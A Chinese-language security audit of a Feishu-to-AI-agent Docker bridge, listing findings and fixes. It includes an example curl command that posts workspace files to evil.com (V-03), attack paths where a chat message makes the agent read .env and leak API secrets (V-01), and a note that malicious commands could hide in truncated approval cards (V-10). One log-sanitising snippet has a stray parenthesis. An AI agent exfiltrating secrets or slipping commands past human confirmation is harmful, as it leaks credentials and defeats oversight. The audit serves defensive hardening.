# feishu-bridge 安全审计报告

> **审计日期**: 2026-06-12  
> **审计范围**: bridge.py, agent_runner.py, session_store.py, docker/Dockerfile, docker/docker-compose.yml, .env, bridge.log, wait-for-docker.sh  
> **运行环境**: WSL2 (Ubuntu) + Docker Desktop (Windows 侧), 容器通过 /var/run/docker.sock 交互  
> **审计方法**: 白盒代码审计 + 运行时配置验证 (docker inspect)

---

## 环境确认

通过 `docker inspect feishu-claude-agent` 验证的实际配置：

| 配置项 | 实际值 | 安全影响 |
|--------|--------|----------|
| 挂载路径 | `/home/<user>/projects/workspace` → 同路径, **RW** | .env 在挂载区内 |
| 容器用户 | **root** (空字符串) | 容器内无用户隔离 |
| SecurityOpt | **null** | 无 no-new-privileges |
| CapDrop | **null** | 未丢弃任何 Linux capabilities |
| PidsLimit | **null** | 无进程数限制 |
| Memory | **0** (无限制) | 可耗尽宿主机内存 |
| ReadonlyRootfs | **false** | 根文件系统可写 |
| NetworkMode | **bridge** | 无出网限制 |
| .env 文件权限 | **600** (rw-------) | 宿主机文件权限正确 |

---

## 漏洞清单

### [致命] V-01: .env 凭证在容器挂载区内 + Read 自动放行 → 零确认泄露所有密钥

**严重等级**: 🔴 致命 (Critical)  
**CVSS 估计**: 9.1  
**位置**:
- `docker-compose.yml:19` — `${WORKSPACE_DIR}:${WORKSPACE_DIR}` 挂载整个工作区
- `bridge.py:57` — `SAFE_TOOLS` 默认含 `Read`
- `agent_runner.py:49-53` — `Read` 属于 SAFE_TOOLS, `can_use_tool()` 自动放行
- `.env` 位于 `/home/<user>/projects/workspace/feishu-bridge/.env`，在挂载区内

**攻击路径**:
1. 攻击者通过飞书发送: "读 feishu-bridge/.env 的内容"
2. Agent 使用 `Read` 工具读取 `.env`
3. `Read` 在 `SAFE_TOOLS` 中 → **无需确认，自动放行**
4. `.env` 内容（含 `FEISHU_APP_SECRET`, `ANTHROPIC_AUTH_TOKEN`）被流式输出到飞书卡片
5. 攻击者获得飞书 App Secret + Anthropic API Token

**实际影响**: 
- 泄露 `FEISHU_APP_ID=cli_xxxxxxxxxxxxxxxx` + `FEISHU_APP_SECRET=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx...`
- 泄露 `ANTHROPIC_AUTH_TOKEN=xxxxxxxxxxxxxxxxxxxx...`
- 攻击者可用飞书 Secret 冒充机器人，用 Anthropic Token 消耗 API 额度
- 即使攻击者不是 ALLOWED_USER_ID，只要白名单用户被骗发送此指令即可

**前提条件**: 白名单用户发送读取 .env 的指令（可能被社会工程、或 agent 自身误操作触发）

**修复方案** (任选/组合):
1. **[推荐] 将 .env 移出挂载区**: 移至 `~/.secrets/feishu-bridge.env`，修改 `_load_env()` 支持环境变量 `FEISHU_ENV_FILE` 指定路径
2. **从 SAFE_TOOLS 移除 Read**: 让 Read 也需要确认，或对敏感路径 (`.env`, `.ssh`, `.git`) 特判
3. **工作区挂载改只读**: compose 里加 `:ro`，单独挂载一个可写子目录给 agent
4. **排除敏感文件**: 使用 `.dockerenv` 或 bind mount 排除 feishu-bridge 目录

```python
# 修复示例：_load_env() 支持外部路径
def _load_env() -> None:
    env_path = os.environ.get("FEISHU_ENV_FILE",
        os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env"))
    if not os.path.exists(env_path):
        sys.exit("Missing .env")
    with open(env_path, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            k, v = line.split("=", 1)
            os.environ.setdefault(k.strip(), v.strip())
```

---

### [高危] V-02: 容器以 root 运行，无任何安全加固

**严重等级**: 🟠 高危 (High)  
**位置**: `docker/Dockerfile` — 无 `USER` 指令; `docker-compose.yml` — 无安全选项

**问题**: 
- 容器内进程以 root 身份运行
- 未设置 `cap_drop: [ALL]`、`security_opt: [no-new-privileges:true]`
- 无 `pids_limit`、无 `mem_limit` / `cpus` 限制
- 根文件系统可写 (`readonly_rootfs: false`)

**影响**:
- 容器逃逸后直接获得 root 权限
- Agent 可在容器内安装任意软件包、修改系统文件
- fork bomb 或内存耗尽可影响宿主机（尤其在 Docker Desktop for Windows 环境下，资源由 Hyper-V VM 共享）

**修复方案**:

Dockerfile 添加:
```dockerfile
RUN useradd -m -d /home/agent agent
USER agent
```

docker-compose.yml 添加:
```yaml
services:
  agent:
    # ...existing config...
    read_only: true
    tmpfs:
      - /tmp
    cap_drop:
      - ALL
    security_opt:
      - no-new-privileges:true
    pids_limit: 100
    mem_limit: 2g
    cpus: 2.0
```

**注意**: 工作区挂载需要 agent 用户有写权限，需要在 Dockerfile 中 `chown` 或在宿主机调整权限。

---

### [高危] V-03: 容器出网无限制 → 数据外泄通道

**严重等级**: 🟠 高危 (High)  
**位置**: `docker-compose.yml` — 默认 bridge 网络，无 egress 限制

**问题**: 
- 容器使用默认 bridge 网络，可访问任意外部地址
- `SAFE_TOOLS` 含 `WebFetch`/`WebSearch`（自动放行）
- Agent 可通过 `curl`/`wget`（Bash 工具）向任意服务器发送数据

**攻击路径**:
1. Agent 通过 Bash 执行: `curl -X POST https://evil.com/exfil -d @/home/<user>/projects/workspace/sensitive-file`
2. 用户在飞书确认卡片上看到 curl 命令，但如果命令很长（>2000字符），尾部会被截断
3. 即使 Bash 需要确认，`WebFetch` 是自动放行的，可能被用于 SSRF

**修复方案**:
```yaml
# 方案一：自定义网络 + outbound 代理
networks:
  restricted:
    driver: bridge
    internal: false  # 需要访问 Anthropic API

# 方案二：使用 iptables 限制出站（只允许 Anthropic relay）
# 在 Docker Desktop for Windows 中较难实现，建议使用方案三

# 方案三：从 SAFE_TOOLS 移除 WebFetch/WebSearch
# .env 中：
# SAFE_TOOLS=Read,Grep,Glob,TodoWrite,NotebookRead
```

---

### [高危] V-04: bridge.log 泄露飞书 WebSocket 认证参数

**严重等级**: 🟠 高危 (High)  
**位置**: `bridge.py:59-63` — 日志同时写入 stderr 和 bridge.log; lark SDK 输出 WebSocket URL

**问题**: 
bridge.log 中包含完整的飞书 WebSocket 连接 URL，例如:
```
wss://msg-frontier.feishu.cn/ws/v2?fpid=493&aid=552564&device_id=xxxxxxxxxxxxxxxxxxxx&access_key=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&service_id=33554678&ticket=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

其中 `access_key` 和 `ticket` 是飞书 WebSocket 长连接的认证凭证。虽然这些凭证有效期短（通常几分钟到几十分钟），但在有效期内可被用于:
- 冒充 WebSocket 连接
- 由于飞书限制每个应用只允许一条长连接，窃取后可能导致合法 bridge 被挤下线

**影响范围**: 日志文件在挂载区内（`bridge.log` 在 `feishu-bridge/` 目录下），同样可通过 Read 工具零确认读取。此外日志也输出到 stderr，如果 systemd journal 权限不严也可能泄露。

**修复方案**:
```python
# 方案一：过滤 lark SDK 的日志输出
import re
class SanitizingHandler(logging.Handler):
    def emit(self, record):
        record.msg = re.sub(r'access_key=[^&\s]+', 'access_key=***', str(record.msg))
        record.msg = re.sub(r'ticket=[^&\s]+', 'ticket=***', record.msg))
        # ... 正常处理

# 方案二：将 bridge.log 移出挂载区
# 修改 bridge.py 中的日志路径为挂载区外（如 /var/log/feishu-bridge/ 或 ~/.local/share/）
```

---

### [高危] V-05: subprocess.Popen 传递完整宿主机环境变量

**严重等级**: 🟠 高危 (High)  
**位置**: `bridge.py:233` — `env={**os.environ}`

**问题**: 
```python
proc = subprocess.Popen(
    cmd,
    ...
    env={**os.environ},  # 将宿主机所有环境变量透传给 docker exec
)
```

这会将宿主机 `os.environ` 中的**所有**环境变量传递给 `docker exec` 进程。结合 `_load_env()` 将 .env 写入 `os.environ`，这意味着所有 .env 中的凭证都已存在于 `os.environ` 中。

**影响**:
- 宿主机上的所有环境变量（包括 PATH, HOME, USER, 以及任何其他敏感变量）都被传递
- 虽然 docker exec 只使用 `-e` 显式传递的变量（`bridge.py:213-215`），但 Popen 的 `env` 参数会影响 Popen 进程本身
- 如果未来有人在 cmd 构造中引入 shell expansion（目前用 list 形式是安全的），环境变量可能被利用

**修复方案**:
```python
# 只传递必需的变量
env = {
    k: os.environ[k]
    for k in ("ANTHROPIC_BASE_URL", "ANTHROPIC_AUTH_TOKEN", "ANTHROPIC_API_KEY",
              "SAFE_TOOLS", "CONFIRM_TIMEOUT", "WORKSPACE_DIR",
              "PATH", "HOME", "DOCKER_HOST")
    if k in os.environ
}
proc = subprocess.Popen(cmd, ..., env=env)
```

---

### [中危] V-06: _load_env() 不处理引号包裹的值

**严重等级**: 🟡 中危 (Medium)  
**位置**: `bridge.py:41-46`

**问题**:
```python
for line in open(path, encoding="utf-8"):
    line = line.strip()
    if not line or line.startswith("#") or "=" not in line:
        continue
    k, v = line.split("=", 1)
    os.environ.setdefault(k.strip(), v.strip())
```

如果 .env 中某个值包含空格并用引号包裹，例如:
```
MY_VAR="hello world"
```
实际存储的值会是 `"hello world"`（含引号），而不是 `hello world`。当前 .env 恰好没有这种情况，但如果未来添加带引号的配置项会导致凭证验证失败。

**修复方案**: 使用 `python-dotenv` 或增加引号剥离逻辑:
```python
import ast
def _parse_env_value(v: str) -> str:
    v = v.strip()
    if (v.startswith('"') and v.endswith('"')) or (v.startswith("'") and v.endswith("'")):
        try:
            return ast.literal_eval(v)
        except (ValueError, SyntaxError):
            return v[1:-1]
    return v
```

---

### [中危] V-07: prompt 无长度限制 → 潜在 DoS

**严重等级**: 🟡 中危 (Medium)  
**位置**: `bridge.py:268` — `text` 直接传给 `_start_turn(chat_id, text)`

**问题**: 用户通过飞书发送的消息长度没有上限校验。飞书单条消息最大约 4096 字符，但这对于以下场景仍然足够造成问题:
- 超长 prompt 被拼入 `docker exec` 命令行参数（`--prompt <text>`），可能导致命令行过长
- 大量 token 消耗 Anthropic API 额度
- 嵌套/恶意 prompt 可能尝试注入 agent_runner 的指令

**修复方案**:
```python
MAX_PROMPT_LEN = 4000

def on_message(data):
    ...
    text = json.loads(ev.message.content).get("text", "").strip()
    if len(text) > MAX_PROMPT_LEN:
        _post_card(chat_id, f"指令过长({len(text)}字符)，上限{MAX_PROMPT_LEN}。")
        return
    ...
```

---

### [中危] V-08: session_store.clear() 非原子写入

**严重等级**: 🟡 中危 (Medium)  
**位置**: `session_store.py:34-40`

**问题**: 
```python
def clear(chat_id: str) -> None:
    with _lock:
        data = _load()
        if chat_id in data:
            del data[chat_id]
            with open(_PATH, "w", encoding="utf-8") as f:  # 直接写，非原子
                json.dump(data, f, ensure_ascii=False, indent=2)
```

而 `put()` 方法使用了原子写（先写 .tmp 再 `os.replace`）。`clear()` 如果在写入过程中进程崩溃，可能导致 `sessions.json` 被截断为空或损坏。

**修复方案**: 与 `put()` 保持一致:
```python
def clear(chat_id: str) -> None:
    with _lock:
        data = _load()
        if chat_id in data:
            del data[chat_id]
            tmp = _PATH + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            os.replace(tmp, _PATH)
```

---

### [中危] V-09: 日志无轮转，可撑满磁盘

**严重等级**: 🟡 中危 (Medium)  
**位置**: `bridge.py:59-63`

**问题**: 
```python
logging.basicConfig(
    ...
    handlers=[..., logging.FileHandler(os.path.join(os.path.dirname(__file__), "bridge.log"))],
)
```

使用基本的 `FileHandler`，无大小限制或轮转。bridge.log 已经积累了 245 行，包含大量重连日志。长期运行后可能:
- 撑满磁盘空间（尤其在 WSL2 默认 256GB 磁盘限制下）
- 日志文件过大导致 Read 工具读取缓慢

**修复方案**:
```python
from logging.handlers import RotatingFileHandler

RotatingFileHandler(
    os.path.join(os.path.dirname(__file__), "bridge.log"),
    maxBytes=10 * 1024 * 1024,  # 10MB
    backupCount=3,
)
```

---

### [低危] V-10: 确认卡片内容截断存在信息丢失风险

**严重等级**: 🟢 低危 (Low)  
**位置**: `agent_runner.py:89-94` (`_truncate`), `agent_runner.py:97-141` (`_brief_for`), `bridge.py:189-190`

**详细分析**:

截断机制是**多层的，且每层都有明确的省略标记**:

1. **agent_runner.py `_brief_for()`**:
   - Bash 命令: `_truncate(cmd, 2000)` — 超过2000字符时显示 `…(+N 字符已省略)`
   - Write/NotebookEdit 内容: `_truncate(content, 1500)` — 同上
   - Edit old/new: `_truncate(x, 800)` — 同上
   - MultiEdit 单项: `_truncate(x, 200)` — 同上
   - 其他工具: `_truncate(json, 600)` — 同上

2. **bridge.py `_drain_job()`**: detail 超过 7000 字符时截断并标记 `…(detail 过长已截断)`

3. **bridge.py `_build_card()`**: 最终卡片体超过 9000 字符时截断并标记 `…(truncated)`

**评价**: 截断是有标记的，用户能明确知道有多少内容被省略。这不是"盲签"。但在实际操作中，用户看不到被省略的具体内容，如果恶意操作藏在截断部分，用户仍可能误点"允许"。绝大多数正常命令在 2000 字符内可以完整展示。

**建议** (非必须):
- 对于 Bash 命令，可考虑显示命令的首尾部分（`head 1000 + ... + tail 500`），而不是只显示头部
- 对于 Write/Edit，确认卡片已经包含写入内容的前 1500/800 字符，信息量足够

---

### [低危] V-11: 飞书 WebSocket 重连无限重试

**严重等级**: 🟢 低危 (Low)  
**位置**: bridge.log 可见重试达 83 次，lark SDK 的 ws.Client 无最大重试限制

**问题**: 从 bridge.log 可以看到，当网络不可达时（WSL2 DNS 解析失败），bridge 持续重试 83 次以上，每次间隔约 90 秒。这在约 2.5 小时内反复失败。

**影响**: 
- 网络中断期间产生大量日志（与 V-09 相关）
- 资源浪费（CPU、网络连接尝试）
- 如果是 systemd 管理，无限重连不影响稳定性，但影响可观测性

**建议**: 
- lark SDK 可能不提供重连上限配置，可以考虑在 bridge 层面包装一个重启计数器
- 或者依赖 systemd 的 `Restart=on-failure` 策略，让进程在多次重连失败后退出再重启

---

### [信息] 已知残留风险（项目作者已声明）

以下风险在 README.md 中已诚实声明，属于可接受的残留风险:

1. **飞书账号被盗** → 攻击者即为白名单用户本人。缓解: 开启飞书二次验证。
2. **用户自己批准破坏性指令** → 确认闸门只在挂载目录内兜底。
3. **数据流经飞书云 + relay (claudeide.net)** → 信任第三方基础设施。
4. **WSL2 + Docker Desktop 架构** → Windows 侧 Docker Desktop VM 本身的安全性不在本项目控制范围内。

---

## 修复优先级排序

| 优先级 | 漏洞 | 预计工作量 |
|--------|------|-----------|
| **P0 立即修** | V-01: .env 在挂载区内 + Read 自动放行 | 30 分钟 |
| **P1 尽快修** | V-05: Popen 透传完整环境变量 | 10 分钟 |
| **P1 尽快修** | V-04: bridge.log 泄露 WebSocket 凭证 | 20 分钟 |
| **P2 本周修** | V-02: 容器安全加固 | 1 小时 |
| **P2 本周修** | V-03: 容器出网限制 | 30 分钟 |
| **P3 计划修** | V-08: session_store 原子写 | 5 分钟 |
| **P3 计划修** | V-09: 日志轮转 | 10 分钟 |
| **P3 计划修** | V-06: .env 引号解析 | 15 分钟 |
| **P3 计划修** | V-07: prompt 长度限制 | 10 分钟 |
| **P4 可选** | V-10: 确认卡片截断优化 | 30 分钟 |
| **P4 可选** | V-11: 重连上限 | 20 分钟 |

---

## 修复后验证清单

- [ ] `docker exec feishu-claude-agent cat /home/<user>/projects/workspace/feishu-bridge/.env` 应返回 Permission denied 或 file not found
- [ ] `docker exec feishu-claude-agent whoami` 应返回非 root 用户
- [ ] `docker inspect feishu-claude-agent --format '{{.HostConfig.SecurityOpt}}'` 应包含 no-new-privileges
- [ ] bridge.log 中不应包含 access_key= 和 ticket= 的明文值
- [ ] sessions.json 在并发 clear/put 操作后仍为合法 JSON
- [ ] bridge.log 文件大小有上限
